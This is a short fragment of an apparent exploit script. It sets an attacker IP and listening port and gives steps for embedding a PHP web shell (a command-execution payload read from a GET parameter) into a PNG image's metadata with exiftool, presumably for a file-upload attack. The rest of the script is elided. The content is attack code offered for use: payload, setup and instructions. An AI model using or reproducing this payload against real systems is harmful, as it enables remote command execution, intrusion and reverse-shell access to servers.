...
lhost = '10.17.92.54' #attacker ip
lport = '5555' #listening port
...
# 1- image name as : "poc.png"
# 2- place the image in the same directory as this exploit.
# 3- inject the php payload via exiftool : exiftool poc.png -CopyrightNotice="<?=\`\$_GET[0]\`?>"
